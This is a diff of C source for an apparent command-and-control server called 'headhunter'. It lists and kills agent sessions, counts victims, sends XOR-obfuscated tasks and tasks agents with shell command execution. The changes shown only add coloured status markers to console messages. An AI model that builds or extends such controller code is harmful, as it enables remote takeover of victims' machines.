@@ -48,16 +48,16 @@ int server_control_session(){
             printf("> use <session id>       |  Switch session to specified connection by id\n");
 	    printf("> kill <session id>      |  Kill socket connection to Agent\n");
             printf("> exit                   |  Close headhunter\n\n");
-        } else if (strcmp(buffer, "show sessions\n") == 0 || strcmp(buffer, "show connections\n") == 0 || strcmp(buffer, "show\n") == 0 || strcmp(buffer, "show \n") == 0) {
-            printf("\nID          Address                  Status \n---------------------------------------------------------\n");
+        } else if (strcmp(newline_terminator(buffer), "show sessions\n") == 0 || strcmp(newline_terminator(buffer), "show connections\n") == 0 || strcmp(newline_terminator(buffer), "show\n") == 0 || strcmp(newline_terminator(buffer), "show \n") == 0) {
+            printf("\nID          Address                  Status \n--------------------------------------------------------------\n");
             for (int i = 0; i < max_clients; i++){
                 if (client_socket[i] == 0){ continue; }	// Continue just in case there is a random NULL socket
-		if(client_status[i] == 1){status = "Active";}
-		else{status = "Inactive";}
+		if(client_status[i] == 1){status = "\e[1;32m[+]\e[0m Active";}
+		else{status = "\e[1;31m[-]\e[0m Inactive";}
 		struct timeval current;
 		gettimeofday(&current, NULL);
 		time_t diff_sec = current.tv_sec - last_check[i].tv_sec;
-		if(diff_sec > 600){status = "Inactive";}
+		if(diff_sec > 600){status = "\e[1;31m[-]\e[0m Inactive";}
                 printf("%-12d%-25s%s %ld seconds ago\n", i + 1, get_socket_addr(client_socket[i]), status, diff_sec);
             }
 	    printf("\n");
@@ -70,9 +70,9 @@ int server_control_session(){
             selected_id += selected_value;
                 
             if (selected_id < 0) {
-                printf("Invalid id!\n\n");
+                printf("\e[1;31m[-]\e[0m Invalid id!\n\n");
             } else {
-                printf("[+] Entering agent control session with session ID: %d...\n", selected_id);
+                printf("\e[1;32m[+]\e[0m Entering agent control session with session ID: %d...\n", selected_id);
                 printf("Type \"bg\" to background agent control session\n");
 		
 		if(threads[selected_id-1] != 0){
@@ -95,9 +95,9 @@ int server_control_session(){
 		selected_id += selected_value;
 
 		if (selected_id < 0){
-			printf("Invalid id!\n\n");
+			printf("\e[1;31m[-]\e[0m Invalid id!\n\n");
 		} else{
-			printf("[+] Killing agent control session with session ID: %d...\n", selected_id);
+			printf("\e[1;32m[+]\e[0m Killing agent control session with session ID: %d...\n", selected_id);
 			selected_id += 3;
 			for(int i = 0; i < max_clients; i++){
 				if(client_socket[i] == selected_id){
@@ -108,11 +108,11 @@ int server_control_session(){
 
 					victim_count--;
 					client_socket[i] = 0;
-					printf("[+] Control session: %d successfully killed.\n", selected_id - 3);
+					printf("\e[1;32m[+]\e[0m Control session: %d successfully killed.\n", selected_id - 3);
 				}
 				
 				else if(i == max_clients){
-					printf("[-] Could not find socket to kill.\n");
+					printf("\e[1;31m[-]\e[0m Could not find socket to kill.\n");
 				}
 			}
 		}
@@ -217,7 +217,7 @@ void *Socket_Writer()
         } 
 	else if(strcmp(newline_terminator(buffer), "exit\n") == 0){
 	
-	    printf("[+] Tasking agent with exit\n");	
+	    printf("\e[1;32m[+]\e[0m Tasking agent with exit\n");	
 	    char* xorbuffer = XOR(buffer, key, n, keylen);
 	    write(a.dest, xorbuffer, n);
 
@@ -228,12 +228,12 @@ void *Socket_Writer()
 	    		a.kill = 1;
 			victim_count--;
 			client_socket[i] = 0;
-			printf("[+] Control session: %d successfully exited.\n", a.dest - 3);
+			printf("\e[1;32m[+]\e[0m Control session: %d successfully exited.\n", a.dest - 3);
 	
 		}
 				
 		else if(i == max_clients){
-			printf("[-] Could not find socket to close.\n");
+			printf("\e[1;31m[-]\e[0m Could not find socket to close.\n");
 		}
 	    }
 
@@ -244,7 +244,7 @@ void *Socket_Writer()
 	else {
 	
 	    if(str_starts_with(buffer, "shell") == 0){
-		printf("\n[+] Tasking agent with command execution\n\n");
+		printf("\n\e[1;32m[+]\e[0m Tasking agent with command execution\n\n");
 	    }
 
 	    char* xorbuffer = XOR(buffer, key, n, keylen);
